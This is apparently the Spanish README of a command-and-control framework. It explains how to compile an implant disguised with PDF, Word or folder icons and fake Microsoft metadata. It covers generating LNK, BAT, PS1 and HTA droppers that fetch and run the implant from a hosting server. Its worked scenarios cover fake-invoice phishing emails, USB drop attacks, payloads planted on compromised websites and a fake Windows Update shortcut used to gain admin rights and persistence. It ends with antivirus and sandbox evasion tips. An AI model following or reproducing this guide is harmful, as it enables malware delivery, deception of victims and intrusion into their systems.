#  Guía Completa: Añadir Iconos y Generar Droppers

##  Tabla de Contenidos
1. [Compilar Agent con Icono](#compilar-agent-con-icono)
2. [Generar Droppers](#generar-droppers)
3. [Ejecutar Pruebas](#ejecutar-pruebas)
4. [Ejemplos Prácticos](#ejemplos-prácticos)
5. [Troubleshooting](#troubleshooting)

---

##  Inicio Rápido (Un Solo Comando)

```powershell
# Compilar agent con icono PDF y generar todos los droppers
.\build_with_icon.ps1 -IconType pdf -DropperType all -Release
```

Esto hará:
-  Descargar icono de PDF
-  Compilar agent en modo release
-  Integrar icono y metadatos
-  Ejecutar pruebas unitarias
-  Generar BAT, LNK, PS1 y HTA droppers

---

## 1⃣ Compilar Agent con Icono

### Opción A: Iconos Predefinidos

```powershell
# Icono de PDF (recomendado para phishing)
.\build_with_icon.ps1 -IconType pdf -Release

# Icono de Word
.\build_with_icon.ps1 -IconType word -Release

# Icono de Excel
.\build_with_icon.ps1 -IconType excel -Release

# Icono de carpeta (para USB drops)
.\build_with_icon.ps1 -IconType folder -Release
```

### Opción B: Icono Personalizado

```powershell
# Usar tu propio icono .ico
.\build_with_icon.ps1 -CustomIcon "C:\mi_icono.ico" -Release

# Convertir imagen PNG/JPG a ICO y usar
python download_icon.py --custom mi_imagen.png --output icon.ico
.\build_with_icon.ps1 -CustomIcon icon.ico -Release
```

### Opción C: Manual (Paso a Paso)

```powershell
# 1. Descargar icono
cd e:\repos\C2R2-v2\dropper
python download_icon.py pdf --output ..\agent\icon.ico

# 2. Compilar agent
cd ..\agent
cargo build --release --features production

# 3. Verificar resultado
ls target\release\agent.exe
```

---

## 2⃣ Generar Droppers

### Método 1: Automático con build_with_icon.ps1

```powershell
# Generar SOLO dropper LNK (más sigiloso)
.\build_with_icon.ps1 -IconType pdf -DropperType lnk -PayloadURL "http://192.168.1.100:8000/agent.exe"

# Generar TODOS los droppers
.\build_with_icon.ps1 -IconType pdf -DropperType all -PayloadURL "http://tu-servidor.com/payload.exe"
```

### Método 2: Manual con builder.py

```powershell
cd e:\repos\C2R2-v2\dropper

# Compilar agent primero
cd ..\agent
cargo build --release

# Generar dropper BAT
cd ..\dropper
python builder.py --agent ..\agent\target\release\agent.exe `
                  --output "Factura_2024.pdf.bat" `
                  --type bat `
                  --url "http://192.168.1.100:8000/agent.exe"

# Generar dropper PowerShell (con encriptación)
python builder.py --agent ..\agent\target\release\agent.exe `
                  --output "documento.ps1" `
                  --type ps1 `
                  --decoy "https://www.google.com"

# Generar dropper HTA (para phishing emails)
python builder.py --agent ..\agent\target\release\agent.exe `
                  --output "documento.hta" `
                  --type hta `
                  --url "http://192.168.1.100:8000/agent.exe"
```

### Método 3: LNK Directo (MÁS RECOMENDADO)

```powershell
# Generar LNK con icono de PDF
.\generate_lnk.ps1 -OutputFile "Factura_Nov_2024.pdf.lnk" `
                   -PayloadURL "http://192.168.1.100:8000/agent.exe" `
                   -DecoyPDF "C:\facturas\factura_real.pdf"

# Resultado: archivo .lnk con icono de PDF que descarga y ejecuta agent
```

---

## 3⃣ Ejecutar Pruebas

### Pruebas Completas

```powershell
cd e:\repos\C2R2-v2\dropper
python test_droppers.py
```

### Pruebas con pytest (más detallado)

```powershell
# Instalar pytest
pip install pytest pytest-cov

# Ejecutar pruebas con cobertura
pytest test_droppers.py -v --cov=. --cov-report=html

# Ver reporte en navegador
start htmlcov/index.html
```

### Saltar Pruebas durante Build

```powershell
.\build_with_icon.ps1 -IconType pdf -SkipTests
```

---

## 4⃣ Ejemplos Prácticos

### Escenario 1: Phishing por Email (Factura Falsa)

```powershell
# 1. Compilar agent con icono de PDF
.\build_with_icon.ps1 -IconType pdf -Release -DropperType lnk

# 2. Renombrar el LNK generado
cd output
Rename-Item "Documento.pdf.lnk" "Factura_Pendiente_Noviembre_2024.pdf.lnk"

# 3. Hostear agent en servidor
cd ..\..\agent\target\release
python -m http.server 8000
# Agent disponible en: http://TU_IP:8000/agent.exe

# 4. Adjuntar el LNK al email con texto:
#    "Estimado cliente, adjuntamos factura pendiente de pago..."
```

### Escenario 2: USB Drop Attack

```powershell
# 1. Compilar con icono de carpeta
.\build_with_icon.ps1 -IconType folder -Release

# 2. Generar dropper BAT
python builder.py --agent ..\agent\target\release\agent.exe `
                  --output "Confidencial.bat" `
                  --type bat `
                  --url "file://E:/hidden/agent.exe"

# 3. Ocultar extensión en Windows
attrib +h *.bat

# 4. Copiar a USB:
#    - agent.exe (oculto en carpeta)
#    - Confidencial.pdf.bat (visible, parece PDF)
#    - documento_real.pdf (decoy)
```

### Escenario 3: Compromiso de Sitio Web

```powershell
# 1. Compilar agent
.\build_with_icon.ps1 -IconType word -Release

# 2. Generar HTA dropper
python builder.py --agent ..\agent\target\release\agent.exe `
                  --output "documento.hta" `
                  --type hta `
                  --url "https://tusitio.com/downloads/documento.exe"

# 3. Subir a sitio comprometido:
#    - Subir agent.exe a /downloads/documento.exe
#    - Subir documento.hta
#    - Crear página: "Descarga el documento aquí"

# 4. Cuando víctima abre el HTA:
#    - Se muestra "Cargando documento..."
#    - Descarga y ejecuta agent en background
#    - Redirige a documento real
```

### Escenario 4: Persistencia con Admin

```powershell
# 1. Compilar agent con metadatos de Windows
.\build_with_icon.ps1 -IconType windows -Release

# 2. Generar LNK que solicita admin
.\generate_lnk.ps1 -OutputFile "WindowsUpdate.lnk" `
                   -PayloadURL "http://192.168.1.100:8000/agent.exe"

# 3. Usuario ejecuta el LNK
#    - Pide UAC (parece Windows Update por icono/metadatos)
#    - Se ejecuta como admin
#    - Establece persistencia: /persist wmi
```

---

## 5⃣ Verificar Resultado

### Ver Icono Integrado

```powershell
# En Windows Explorer:
# 1. Navegar a: e:\repos\C2R2-v2\agent\target\release\
# 2. Click derecho en agent.exe > Propiedades
# 3. Ver icono en la parte superior
```

### Ver Metadatos

```powershell
# PowerShell
$exe = "e:\repos\C2R2-v2\agent\target\release\agent.exe"
[System.Diagnostics.FileVersionInfo]::GetVersionInfo($exe) | Format-List

# Resultado:
# FileDescription  : Microsoft Windows Security Health Service
# CompanyName      : Microsoft Corporation
# ProductName      : Windows Security Health Service
# FileVersion      : 10.0.22621.1
```

### Probar Dropper

```powershell
# 1. Iniciar C2 server
cd e:\repos\C2R2-v2\c2r2-server
cargo run

# 2. En otra terminal, hostear agent
cd ..\agent\target\release
python -m http.server 8000

# 3. En VM Windows, ejecutar dropper
# 4. Ver conexión en el servidor C2
```

---

##  Troubleshooting

### Error: "Python no encontrado"

```powershell
# Instalar Python
winget install Python.Python.3.11
```

### Error: "Pillow no instalado"

```powershell
python -m pip install pillow requests
```

### Error: "winres compile failed"

```powershell
# Verificar que icon.ico existe
Test-Path e:\repos\C2R2-v2\agent\icon.ico

# Si no existe, descargar
cd e:\repos\C2R2-v2\dropper
python download_icon.py pdf --output ..\agent\icon.ico
```

### Error: "Cargo build failed"

```powershell
# Limpiar build anterior
cd e:\repos\C2R2-v2\agent
cargo clean
cargo build --release
```

### LNK no muestra icono correcto

```powershell
# El índice de icono puede ser diferente según tu versión de Windows
# Probar diferentes índices:
.\generate_lnk.ps1 -OutputFile "test.lnk" `
                   -PayloadURL "http://test.com/agent.exe" `
                   -IconIndex 104  # Probar: 102, 103, 104, 105
```

### Dropper detectado por AV

**Soluciones:**
1. Usar LNK en vez de BAT (menos detección)
2. Encriptar payload con XOR (dropper PS1)
3. Hostear en dominio legítimo (AWS, Azure)
4. Añadir más delays en el dropper
5. Cambiar nombres de variables

```powershell
# Regenerar con diferentes nombres
.\build_with_icon.ps1 -IconType pdf -DropperType lnk
# Editar generate_lnk.ps1 y cambiar:
# - WmiPrvSE.exe por otro nombre
# - Cambiar User-Agent
# - Añadir delay: timeout /t 10
```

---

##  Comparativa de Droppers

| Tipo | Detección AV | Facilidad | Realismo | Mejor Para |
|------|--------------|-----------|----------|------------|
| **LNK** | ⭐⭐⭐⭐⭐ Muy Bajo | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Email phishing |
| **BAT** | ⭐⭐⭐ Medio | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | Pruebas rápidas |
| **PS1** | ⭐⭐ Alto | ⭐⭐⭐ | ⭐⭐⭐ | Targets técnicos |
| **HTA** | ⭐⭐⭐⭐ Bajo | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Web compromiso |

---

##  Tips de Evasión

1. **Nombres Realistas**: Usa nombres que la víctima espere ver
   -  `Factura_Noviembre_2024.pdf.lnk`
   -  `payload.exe.lnk`

2. **Timing**: Añade delays para evitar sandboxes
   ```powershell
   timeout /t 10 /nobreak >nul
   ```

3. **Hosting Legítimo**: Hostea payloads en servicios legítimos
   - AWS S3
   - Google Drive (con link directo)
   - OneDrive

4. **Metadatos Falsos**: El build.rs ya añade metadatos de Microsoft
   - Compañía: Microsoft Corporation
   - Producto: Windows Security Health Service

5. **Iconos Apropiados**: Usa iconos que coincidan con el pretexto
   - Factura → PDF icon
   - Presupuesto → Excel icon
   - Contrato → Word icon

---

##  Referencias

- [Iconos de alta calidad](https://iconarchive.com/)
- [Windows Icon Format](https://en.wikipedia.org/wiki/ICO_(file_format))
- [Resource Hacker](http://www.angusj.com/resourcehacker/)
- [LNK File Format](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/)

---

¿Preguntas? Revisa los logs de compilación o ejecuta las pruebas unitarias para más detalles.
